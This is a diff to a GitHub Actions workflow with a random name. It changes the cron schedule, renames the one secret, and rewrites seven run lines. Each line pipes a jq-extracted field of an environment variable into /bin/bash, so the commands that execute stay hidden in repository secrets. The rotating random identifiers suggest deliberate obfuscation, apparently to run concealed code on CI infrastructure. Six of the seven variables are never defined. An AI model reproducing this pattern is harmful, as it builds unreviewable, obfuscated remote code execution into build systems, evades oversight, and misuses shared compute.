@@ -1,9 +1,10 @@
 name: qiaowushengxideshasi
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 1/6 * * *'
-jobs:  # 20365
+    - cron: '42 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,13 +12,13 @@ jobs:  # 20365
       - uses: actions/checkout@v4
       - name: qiaowushengxideshasi
         env:
-          bi0: ${{ secrets.bi0 }}
+          ik57529: ${{ secrets.ik57529 }}
         run: |
-          echo $bi0 | jq -r .jxk78 | /bin/bash
-          echo $voxav5 | jq -r .wo79162 | /bin/bash
-          echo $ny767 | jq -r .zokn4946 | /bin/bash
-          echo $sw31065 | jq -r .ny160 | /bin/bash
-          echo $f95227 | jq -r .gndxa8 | /bin/bash
-          echo $amz56278 | jq -r .xj4 | /bin/bash
-          echo $ovzta36354 | jq -r .p3 | /bin/bash
+          echo $ik57529 | jq -r .dktve4 | /bin/bash
+          echo $q4 | jq -r .jleg2922 | /bin/bash
+          echo $ymu401 | jq -r .ihunu02 | /bin/bash
+          echo $vdmc52 | jq -r .ihht8421 | /bin/bash
+          echo $y5 | jq -r .zauk45 | /bin/bash
+          echo $jejf861 | jq -r .shy640 | /bin/bash
+          echo $ufqbb99 | jq -r .xswz17 | /bin/bash
 
